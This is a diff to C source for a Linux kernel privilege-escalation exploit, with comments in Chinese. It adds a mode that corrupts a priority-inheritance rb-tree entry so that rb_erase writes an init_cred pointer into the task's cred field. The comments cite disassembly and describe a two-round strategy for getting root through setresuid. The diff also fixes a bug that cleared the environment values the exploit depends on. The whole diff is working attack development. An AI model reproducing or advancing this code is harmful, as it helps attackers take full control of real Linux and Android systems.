@@ -810,7 +810,54 @@ int run_exploit(int argc, char **argv) {
          *   child≠0 → 无 rebalance(ELF 反汇编实证), 两个 store 都落在合法可写内存。
          * FIX_MODE(可选卫生轮): 零写 [init_cred+4] → uid+gid 归零。
          * 窗口模式: mt46 的 uid 零写轮扫(保留, 作对照/备份路线)。 */
-        if (getenv("PSELECT_PTR_MODE")) {
+        if (getenv("PSELECT_PTR_PI")) {
+          /* mt72 (E4): pi_tree_entry 继承色写 — 绕开 C 几何悖论。
+           * 指令级推导 (rb_erase CASE_A 反汇编实证, 见
+           * CHECKPOINT_C_stage_paradox_20260901.md):
+           *   PI_PC(word3)=写值, PI_RIGHT(word4)=写目标, PI_LEFT(word5)=0
+           *   → child=word4≠0 → 无 rebalance (cbz x8 不跳, x10=xzr)
+           *   → 检查 *(word3+0x10)==node? ne (init_cred+0x10=euid/egid=0)
+           *   → STORE(a) *(word3+8)=word4   (init_cred gid/suid 区污染, 无害)
+           *   → STORE(b) *(word4+0)=word3   ★[task+0x780]=init_cred 别名★
+           * 主树无害化: pc=fake_lock 喷页零区, right=left=0
+           *   → CASE_A child=0 → 只写 [fake_lock+8]=0 (零区自写), 无旋转。
+           * 用法A·两轮策略(两进程, 一进程一写 — crash#2 教训 RETRY=1):
+           *   R 轮(主树写 real_cred)后, E4 轮(本模式, external
+           *   PSELECT_TASK=R 轮 child)补写 cred → real==cred==init_cred 别名
+           *   → AND-gate (CapEff 满 && euid==0) 命中 → setresuid → root。
+           * 用法B·隔离实验(fork, 无 PSELECT_TASK): 只写 cred — CapEff 空 &&
+           *   euid=0 半程态, STRICT AND-gate 结构性不触发, 安全; 判据=
+           *   mt49_child_status.txt 出现 euid=0 且 CapEff=0。
+           * stage=C: mt51 发间中止信号 = euid==0 (cred 已换)。外部模式下 R
+           * 轮已把 CapEff 打满 — R 语义(CapEff 满即中止)会首发后误停,
+           * 必须显式 C 语义, 否则 E4 静默变单发。 */
+          uintptr_t pi_value = P0_DATA_ALIAS_CONST(INIT_CRED);
+          char *mt72_pv = getenv("PSELECT_PTR_VALUE");
+          if (mt72_pv && *mt72_pv) pi_value = strtoull(mt72_pv, NULL, 0);
+          size_t mt72_toff = TASK_REAL_CRED_OFF + 8; /* 默认 task+0x780 (cred) */
+          char *mt72_pt = getenv("PSELECT_PTR_TARGET_OFF");
+          if (mt72_pt && *mt72_pt) mt72_toff = strtoull(mt72_pt, NULL, 0);
+          if (!fake_lock) {
+            pr_error("mt72: PTR_PI but no spray page (fake_lock=0) - ABORT attempt\n");
+            fflush(stdout);
+            break;
+          }
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)fake_lock);
+          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(left_env, sizeof(left_env), "0");
+          char mt72_pi_pc[32], mt72_pi_right[32];
+          snprintf(mt72_pi_pc, sizeof(mt72_pi_pc), "%zx", (size_t)pi_value);
+          snprintf(mt72_pi_right, sizeof(mt72_pi_right), "%zx",
+                   (size_t)(task + mt72_toff));
+          setenv("PSELECT_PI_PC", mt72_pi_pc, 1);
+          setenv("PSELECT_PI_RIGHT", mt72_pi_right, 1);
+          setenv("PSELECT_PI_LEFT", "0", 1);
+          setenv("PSELECT_PTR_STAGE", "C", 1);
+          pr_info("mt72: PI-write task=%016zx target=+%zx value=%zx "
+                  "main_pc=%s (STORE(b)→[task+%zx]=value, 主树无害)\n",
+                  (size_t)task, mt72_toff, (size_t)pi_value, pc_env, mt72_toff);
+          fflush(stdout);
+        } else if (getenv("PSELECT_PTR_MODE")) {
           /* mt48 两轮换指针: BUG_ON(task->cred != task->real_cred) 已铁证
            * (commit_creds@0xffffffc008185174: ldr x19,[x20,#0x778]; ldr x8,[x20,#0x780];
            *  cmp x8,x19; b.ne→brk#0x800) — 单发只换 cred + 子进程 setresgid =
@@ -909,9 +956,14 @@ int run_exploit(int argc, char **argv) {
         setenv("PSELECT_WPC", "0", 1);
         setenv("PSELECT_WRIGHT", "0", 1);
         setenv("PSELECT_WLEFT", "0", 1);
-        setenv("PSELECT_PI_PC", "0", 1);
-        setenv("PSELECT_PI_RIGHT", "0", 1);
-        setenv("PSELECT_PI_LEFT", "0", 1);
+        /* mt72 修复: PI 轮不重置 PI 词。旧代码无条件清零 PSELECT_PI_* —
+         * E4 块在上面 setenv 的 PI_PC/PI_RIGHT/PI_LEFT 在这里被抹掉,
+         * pi erase 退化为全零 root 路径, E4 写静默失效(写了等于没写)。 */
+        if (!getenv("PSELECT_PTR_PI")) {
+          setenv("PSELECT_PI_PC", "0", 1);
+          setenv("PSELECT_PI_RIGHT", "0", 1);
+          setenv("PSELECT_PI_LEFT", "0", 1);
+        }
         pr_info("mt28m: cred write attempt %d/%d fake_cred=%016zx\n",
                 att, retries, (size_t)fake_cred);
         fflush(stdout);
